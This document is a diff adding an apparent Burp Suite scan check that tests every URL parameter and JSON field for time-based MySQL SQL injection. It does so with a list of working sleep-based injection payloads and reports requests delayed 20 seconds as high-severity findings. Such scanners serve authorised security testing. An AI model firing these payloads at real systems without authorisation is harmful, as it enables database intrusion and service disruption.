@@ -1,0 +1,339 @@
+id: a7b2c4d6-e8f0-4a2b-9c1d-3e5f7a8b9c0d
+name: MySQL Time-Based Active Scan (Per Request)
+function: SCAN_CHECK_ACTIVE_PER_REQUEST
+location: SCANNER
+source: |
+  /**
+  * Detects time-based MySQL SQL injection - runs once per request.
+  * Iterates through ALL URL parameters directly (like the Repeater version).
+  * Handles both regular parameters and JSON-encoded parameters in GET requests.
+  * Tests empty JSON fields as both strings and arrays.
+  * Uses custom URL encoding for full control.
+  * @author slicingmelon
+  **/
+  
+  var payloads = java.util.List.of(
+    //"'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z",
+    "'XOR(if(isnull(nullif(now(),sysdate())),sleep(20),0))XOR'Z",
+    "'(select(1)from(select(sleep(20)))a)'",
+    "(select(1)from(select(sleep(20)))a)",
+    "(select(1)from(select(sleep(20)))a)-- z",
+    //"'+(select(1)from(select(sleep(20)))a)+'",
+    "-(select(1)from(select(sleep(20)))a)",
+    ",(select(1)from(select(sleep(20)))a)",
+    ",(select(1)from(select(sleep(20)))a)-- z",
+    //"'OR(select(1)from(select(sleep(20)))a)OR'Z",
+    "'AND(select(1)from(select(sleep(20)))a)AND'Z",
+    " AND (select(1)from(select(sleep(20)))a)-- z",
+    "' AND (select(1)from(select(sleep(20)))a)-- z",
+    ") AND (select(1)from(select(sleep(20)))a)-- z",
+    "') AND (select(1)from(select(sleep(20)))a)-- z",
+    "->test\"',(select(1)from(select(sleep(20)))a)-- z\"'",
+    //"->test\"'))# (select(1)from(select(sleep(20)))a)-- z",
+    "->test\"' ASC, (select(1)from(select(sleep(20)))a)) DESC-- z\"'",
+    "->test\"') XOR (select(1)from(select(sleep(20)))a)-- z\"'"
+  );
+  
+  var detectionThresholdMs = 20000L;
+  
+  // Custom URL encode - only encodes space, +, #, = (characters that break URL structure)
+  var customUrlEncode = (java.util.function.Function<String, String>)(str -> {
+    return str.replace(" ", "%20")
+              .replace("+", "%2b")
+              .replace("#", "%23")
+              .replace("=", "%3D");
+  });
+  
+  // Helper function to minify JSON (remove pretty-print formatting from toJsonString())
+  var minifyJson = (java.util.function.Function<String, String>)(jsonStr -> {
+    return jsonStr.replace("\n", "")
+                  .replace("\r", "")
+                  .replaceAll("\\{\\s+", "{")
+                  .replaceAll("\\[\\s+", "[")
+                  .replaceAll("\\s+\\}", "}")
+                  .replaceAll("\\s+\\]", "]")
+                  .replaceAll(",\\s+", ",")
+                  .replaceAll(":\\s+", ":");
+  });
+  
+  // Helper function to inject payload into a JSON string
+  var injectIntoJson = (java.util.function.BiFunction<String, String, java.util.List<java.util.Map.Entry<String, String>>>)((jsonStr, payload) -> {
+    var results = new java.util.ArrayList<java.util.Map.Entry<String, String>>();
+    try {
+      var jsonNode = JsonNode.jsonNode(jsonStr);
+      var jsonObj = jsonNode.asObject();
+      var jsonMap = jsonObj.asMap();
+      
+      for (var entry : jsonMap.entrySet()) {
+        String targetKey = entry.getKey();
+        var targetValueNode = entry.getValue();
+        
+        if (targetValueNode.isString() || targetValueNode.isNull()) {
+          String originalValue = targetValueNode.isString() ? targetValueNode.asString() : "";
+          boolean isEmpty = originalValue.isEmpty();
+          
+          // Test 1: Inject as string
+          var newJsonObj = JsonObjectNode.jsonObjectNode();
+          for (var e : jsonMap.entrySet()) {
+            String k = e.getKey();
+            var valueNode = e.getValue();
+            
+            if (k.equals(targetKey)) {
+              String origVal = valueNode.isString() ? valueNode.asString() : "";
+              newJsonObj.putString(k, origVal + payload);
+            } else {
+              if (valueNode.isString()) {
+                newJsonObj.putString(k, valueNode.asString());
+              } else if (valueNode.isNull()) {
+                newJsonObj.put(k, JsonNullNode.jsonNullNode());
+              } else {
+                newJsonObj.put(k, valueNode);
+              }
+            }
+          }
+          String mutatedJsonStr = minifyJson.apply(newJsonObj.toJsonString());
+          results.add(new java.util.AbstractMap.SimpleEntry<>(targetKey, mutatedJsonStr));
+          
+          // Test 2: If field is empty, also try as array
+          if (isEmpty) {
+            var newJsonObjArray = JsonObjectNode.jsonObjectNode();
+            for (var e : jsonMap.entrySet()) {
+              String k = e.getKey();
+              var valueNode = e.getValue();
+              
+              if (k.equals(targetKey)) {
+                var payloadArray = JsonArrayNode.jsonArrayNode();
+                payloadArray.addString(payload);
+                newJsonObjArray.put(k, payloadArray);
+              } else {
+                if (valueNode.isString()) {
+                  newJsonObjArray.putString(k, valueNode.asString());
+                } else if (valueNode.isNull()) {
+                  newJsonObjArray.put(k, JsonNullNode.jsonNullNode());
+                } else {
+                  newJsonObjArray.put(k, valueNode);
+                }
+              }
+            }
+            String mutatedJsonStrArray = minifyJson.apply(newJsonObjArray.toJsonString());
+            results.add(new java.util.AbstractMap.SimpleEntry<>(targetKey + "[]", mutatedJsonStrArray));
+          }
+          
+        } else if (targetValueNode.isArray()) {
+          var targetArray = targetValueNode.asArray();
+          int arraySize = targetArray.asList().size();
+          
+          for (int i = 0; i < arraySize; i++) {
+            var arrayElement = targetArray.get(i);
+            
+            if (arrayElement.isString() || arrayElement.isNull()) {
+              var newJsonObj = JsonObjectNode.jsonObjectNode();
+              
+              for (var e : jsonMap.entrySet()) {
+                String k = e.getKey();
+                var valueNode = e.getValue();
+                
+                if (k.equals(targetKey)) {
+                  var newArray = JsonArrayNode.jsonArrayNode();
+                  for (int j = 0; j < arraySize; j++) {
+                    var elem = targetArray.get(j);
+                    if (j == i) {
+                      String originalValue = elem.isString() ? elem.asString() : "";
+                      newArray.addString(originalValue + payload);
+                    } else {
+                      if (elem.isString()) {
+                        newArray.addString(elem.asString());
+                      } else if (elem.isNull()) {
+                        newArray.add(JsonNullNode.jsonNullNode());
+                      } else {
+                        newArray.add(elem);
+                      }
+                    }
+                  }
+                  newJsonObj.put(k, newArray);
+                } else {
+                  if (valueNode.isString()) {
+                    newJsonObj.putString(k, valueNode.asString());
+                  } else if (valueNode.isNull()) {
+                    newJsonObj.put(k, JsonNullNode.jsonNullNode());
+                  } else {
+                    newJsonObj.put(k, valueNode);
+                  }
+                }
+              }
+              
+              String mutatedJsonStr = minifyJson.apply(newJsonObj.toJsonString());
+              results.add(new java.util.AbstractMap.SimpleEntry<>(targetKey + "[" + i + "]", mutatedJsonStr));
+            }
+          }
+        }
+      }
+    } catch (Exception e) {
+      // Silently skip invalid JSON
+    }
+    return results;
+  });
+  
+  // Burp calls this once per REQUEST (not per insertion point)
+  var issues = new java.util.ArrayList<AuditIssue>();
+  
+  var baseRequest = requestResponse.request();
+  if (baseRequest == null) return AuditResult.auditResult();
+  
+  // Get ALL URL parameters directly (like the Repeater version)
+  var urlParameters = baseRequest.parameters().stream()
+    .filter(p -> p.type() == HttpParameterType.URL)
+    .toList();
+  
+  if (urlParameters.isEmpty()) {
+    return AuditResult.auditResult();
+  }
+  
+  // Iterate through each URL parameter
+  for (var parameter : urlParameters) {
+    String name = parameter.name();
+    String value = parameter.value();
+    
+    // URL decode the value to check if it's JSON
+    var decodedValue = api().utilities().urlUtils().decode(value);
+    
+    // Check if it's JSON
+    if (decodedValue != null && !decodedValue.isEmpty() && 
+        decodedValue.strip().startsWith("{") && decodedValue.strip().endsWith("}") &&
+        api().utilities().jsonUtils().isValidJson(decodedValue)) {
+      
+      // Handle JSON parameter - inject into each JSON field
+      for (String payload : payloads) {
+        var jsonMutations = injectIntoJson.apply(decodedValue, payload);
+        
+        for (var jsonMutation : jsonMutations) {
+          var jsonField = jsonMutation.getKey();
+          var mutatedJson = jsonMutation.getValue();
+          
+          // URL encode the mutated JSON (standard encoding for JSON)
+          var encodedMutatedJson = api().utilities().urlUtils().encode(mutatedJson);
+          
+          // Create new parameter with mutated JSON
+          var newParam = HttpParameter.urlParameter(name, encodedMutatedJson);
+          var mutatedRequest = baseRequest.withParameter(newParam);
+          
+          var result = http.sendRequest(mutatedRequest);
+          if (!result.hasResponse()) continue;
+          
+          var timingOpt = result.timingData();
+          if (timingOpt.isEmpty()) continue;
+          
+          var timing = timingOpt.get();
+          java.time.Duration tStart = timing.timeBetweenRequestSentAndStartOfResponse();
+          long startMs = (tStart != null ? tStart.toMillis() : -1);
+          
+          if (startMs >= detectionThresholdMs && startMs != -1) {
+            var detail = String.format("JSON param '%s' field '%s' with payload '%s' caused %dms delay", 
+              name, jsonField, payload, startMs);
+            
+            // Find payload position in request for red marker highlighting (using ByteArray)
+            var reqBytes = mutatedRequest.toByteArray();
+            var urlEncodedPayload = api().utilities().urlUtils().encode(payload);
+            var payloadIndex = reqBytes.indexOf(payload);
+            var payloadLength = payload.length();
+            if (payloadIndex == -1) {
+              payloadIndex = reqBytes.indexOf(urlEncodedPayload);
+              payloadLength = urlEncodedPayload.length();
+            }
+            
+            var markedResult = result;
+            if (payloadIndex != -1) {
+              markedResult = result.withRequestMarkers(
+                Marker.marker(Range.range(payloadIndex, payloadIndex + payloadLength))
+              );
+            }
+            
+            issues.add(
+              AuditIssue.auditIssue(
+                "MySQL Time-Based SQL Injection (JSON)",
+                detail,
+                "Use parameterized queries",
+                mutatedRequest.url(),
+                AuditIssueSeverity.HIGH,
+                AuditIssueConfidence.CERTAIN,
+                "",
+                "",
+                AuditIssueSeverity.HIGH,
+                markedResult
+              )
+            );
+          }
+        }
+      }
+    } else {
+      // Handle regular parameter - inject directly
+      for (String payload : payloads) {
+        // Custom URL encode the payload (only space, +, #, =) - YOU control the encoding!
+        var encodedPayload = customUrlEncode.apply(payload);
+        
+        // Create new parameter with payload appended
+        var newParam = HttpParameter.urlParameter(name, value + encodedPayload);
+        var mutatedRequest = baseRequest.withParameter(newParam);
+        
+        var result = http.sendRequest(mutatedRequest);
+        if (!result.hasResponse()) continue;
+        
+        var timingOpt = result.timingData();
+        if (timingOpt.isEmpty()) continue;
+        
+        var timing = timingOpt.get();
+        java.time.Duration tStart = timing.timeBetweenRequestSentAndStartOfResponse();
+        long startMs = (tStart != null ? tStart.toMillis() : -1);
+        
+        if (startMs >= detectionThresholdMs && startMs != -1) {
+          var detail = String.format("Param '%s' with payload '%s' caused %dms delay", 
+            name, payload, startMs);
+          
+          // Find payload position in request for red marker highlighting (using ByteArray)
+          var reqBytes = mutatedRequest.toByteArray();
+          var payloadIndex = reqBytes.indexOf(encodedPayload);
+          var payloadLength = encodedPayload.length();
+          if (payloadIndex == -1) {
+            var fullyEncodedPayload = api().utilities().urlUtils().encode(payload);
+            payloadIndex = reqBytes.indexOf(fullyEncodedPayload);
+            payloadLength = fullyEncodedPayload.length();
+          }
+          if (payloadIndex == -1) {
+            payloadIndex = reqBytes.indexOf(payload);
+            payloadLength = payload.length();
+          }
+          
+          var markedResult = result;
+          if (payloadIndex != -1) {
+            markedResult = result.withRequestMarkers(
+              Marker.marker(Range.range(payloadIndex, payloadIndex + payloadLength))
+            );
+          }
+          
+          issues.add(
+            AuditIssue.auditIssue(
+              "MySQL Time-Based SQL Injection",
+              detail,
+              "Use parameterized queries",
+              mutatedRequest.url(),
+              AuditIssueSeverity.HIGH,
+              AuditIssueConfidence.CERTAIN,
+              "",
+              "",
+              AuditIssueSeverity.HIGH,
+              markedResult
+            )
+          );
+        }
+      }
+    }
+  }
+  
+  // Return all issues found (or empty if none)
+  if (issues.isEmpty()) {
+    return AuditResult.auditResult();
+  } else {
+    return AuditResult.auditResult(issues);
+  }
+
+
